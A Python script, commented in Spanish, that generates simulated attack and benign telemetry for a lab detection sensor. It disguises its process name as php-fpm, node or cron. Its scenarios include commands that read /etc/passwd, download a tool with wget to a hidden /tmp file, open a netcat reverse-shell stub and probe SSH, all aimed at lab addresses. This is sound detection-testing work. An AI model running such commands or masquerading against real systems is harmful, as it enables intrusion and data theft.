#!/usr/bin/env python3
"""simular ESCENARIO: genera la telemetría que dejaría un ataque, o una tarea normal.

No explota ninguna vulnerabilidad. Corre dentro del contenedor del servicio, toma
el nombre del proceso que haría eso en producción (php-fpm, node, cron) y lanza
los mismos comandos que se verían en un incidente real. El sensor los registra
igual que si hubieran pasado de verdad.

Todos los destinos son del laboratorio: el "Internet" es 10.99.0.0/24 y el router
descarta esas conexiones, así que lo que queda es el intento.
"""
from __future__ import annotations

import ctypes
import socket
import subprocess
import sys
import time

PR_SET_NAME = 15

# nombre: (host donde corre, proceso padre, etiqueta, técnica, descripción, comandos)
ESCENARIOS: dict[str, tuple] = {
    "webshell": (
        "web-01", "php-fpm", "malicioso", "T1059, T1105",
        "Webshell en el portal: reconocimiento y descarga de una herramienta",
        [
            "id; sleep 1; true",
            "uname -a; sleep 1; true",
            "cat /etc/passwd; sleep 1; true",
            "wget -q -T 3 -O /tmp/.x http://10.99.0.66/x",
        ],
    ),
    "reverse-shell": (
        "api-01", "node", "malicioso", "T1059",
        "La API abre un shell reverso hacia Internet",
        ["sleep 3 | nc 10.99.0.66 4444"],
    ),
    "movimiento-lateral": (
        "web-01", "php-fpm", "malicioso", "T1021",
        "Desde el web se intenta entrar por SSH a la base",
        ["sleep 2 | nc 10.20.0.13 22"],
    ),
    "actualizacion": (
        "web-01", "cron", "benigno", "T1105",
        "Tarea programada que baja el índice de paquetes del espejo interno",
        ["wget -q -T 5 -O /tmp/APKINDEX.tar.gz http://10.10.0.5/alpine/APKINDEX.tar.gz"],
    ),
    "firmas": (
        "db-01", "cron", "benigno", "T1105",
        "La base actualiza las firmas del antivirus desde el espejo",
        ["wget -q -T 5 -O /tmp/firmas.db http://10.10.0.5/firmas/main.cvd"],
    ),
}

# Por qué algunos comandos terminan en "; sleep 1; true": el sensor muestrea cada
# 50 ms y `sh -c` hace exec del último comando, así que un `sh -c id` dura apenas
# milisegundos. Con el `true` al final el shell sigue vivo mientras corre el resto
# y el sensor alcanza a verlo. Es una concesión al sensor por muestreo (ver sensor.py).


def nombrar(nombre: str) -> None:
    ctypes.CDLL(None).prctl(PR_SET_NAME, nombre.encode()[:15], 0, 0, 0)


def listar() -> None:
    print("Escenarios:")
    for nombre, (host, padre, etiqueta, tecnica, desc, _) in ESCENARIOS.items():
        print(f"  {nombre:<20} {host:<8} {etiqueta:<10} {tecnica:<13} {desc}")


def main() -> int:
    if len(sys.argv) != 2 or sys.argv[1] not in ESCENARIOS:
        listar()
        return 64
    host, padre, etiqueta, tecnica, desc, comandos = ESCENARIOS[sys.argv[1]]
    if socket.gethostname() != host:
        print(f"el escenario {sys.argv[1]} corre en {host}, no en {socket.gethostname()}", file=sys.stderr)
        return 64

    print(f"[{sys.argv[1]}] {desc} ({etiqueta}, {tecnica})")
    nombrar(padre)
    for cmd in comandos:
        print(f"  {padre} -> sh -c {cmd!r}")
        try:
            subprocess.run(["sh", "-c", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except subprocess.TimeoutExpired:
            pass
        time.sleep(0.3)
    # Margen para que el sensor mande el último lote.
    time.sleep(1.5)
    return 0


if __name__ == "__main__":
    sys.exit(main())
